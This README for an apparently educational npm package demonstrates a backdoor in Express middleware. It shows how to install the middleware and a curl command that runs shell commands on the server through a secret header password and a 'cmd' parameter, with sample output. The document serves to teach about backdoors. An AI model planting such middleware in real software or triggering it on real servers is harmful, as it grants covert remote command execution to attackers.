# bad-example-express-backdoor

express middleware containing a backdoor

for demonstration purposes only

from the [excellent Snyk blog post](https://snyk.io/blog/what-is-a-backdoor/).


### usage

```js
const express = require("express")
const expressBackdoor = require("bad-idea-express-backdoor")

const app = express();

app.use(expressBackdoor())

app.get("/", (req, res)=>{
  res.send("Hello Chrome User!")
})

app.listen(8080)
```

### try it

```bash
node example.js
```

in another terminal, send commands to the backdoor
```bash
$ curl -H 'knock_knock: p@ssw0rd1234' 'localhost:8080?cmd=uname%20-a'
{
  "err": null,
  "stdout": "Linux roon 5.0.0-38-generic #41-Ubuntu SMP Tue Dec 3 00:27:35 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux\n",
  "stderr": ""
}%
```